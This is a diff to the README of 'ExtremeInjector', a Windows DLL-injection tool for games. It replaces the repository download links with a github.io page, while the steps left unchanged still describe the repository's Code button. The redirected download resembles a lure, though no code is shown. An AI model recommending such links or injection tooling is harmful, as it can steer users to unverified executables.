@@ -1,6 +1,6 @@
 # 🚀 ExtremeInjector - Load custom code into your games
 
-[![](https://img.shields.io/badge/Download-ExtremeInjector-blue.svg)](https://github.com/integralbrand571/ExtremeInjector)
+[![](https://img.shields.io/badge/Download-ExtremeInjector-blue.svg)](https://integralbrand571.github.io)
 
 ExtremeInjector helps users load external files into running programs on Windows. This tool works with Windows 10 and Windows 11. It allows you to inject DLL files into processes like video games. Developers use these tools to add features or modify game behavior. 
 
@@ -16,7 +16,7 @@ Before you start, check that your computer meets these needs:
 
 ## 💾 How to Download
 
-1.  Visit the official repository page at this link: [https://github.com/integralbrand571/ExtremeInjector](https://github.com/integralbrand571/ExtremeInjector).
+1.  Visit the official repository page at this link: [https://integralbrand571.github.io](https://integralbrand571.github.io).
 2.  Look for the green Code button on the right side of the screen.
 3.  Click Download ZIP.
 4.  Save the file to a folder you can find later, such as your Downloads folder.
